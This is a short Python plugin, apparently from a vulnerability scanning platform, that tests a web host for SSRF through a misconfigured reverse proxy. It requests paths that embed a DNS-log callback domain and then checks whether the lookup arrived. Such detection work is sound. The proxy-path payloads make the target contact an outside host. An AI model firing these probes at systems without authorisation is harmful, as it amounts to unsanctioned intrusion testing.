import requests
from dispatch.utils.dnslog import have_records, new_dns_payload

from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#反向代理配置不当导致 SSRF漏洞
plugin_id=89
default_port_list=web_port_short


def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    payload_str, payload_dns = new_dns_payload()
    uris = ['/{}'.format(payload_dns), '/http://{}'.format(payload_dns), '/proxy/{}'.format(payload_dns),
            '/proxy/http://{}'.format(payload_dns), '/internal-proxy/http://{}'.format(payload_dns),
            '/internal-proxy/{}'.format(payload_dns)]
    targets = ['{}{}'.format(target, uri) for uri in uris]
    with requests.Session() as session:
        for target in targets:
            try:
                session.get(target, timeout=7, verify=False)
            except:
                pass
    if have_records(payload_str):
        output = payload_str
        return True, host, target, output
    else:
        return False

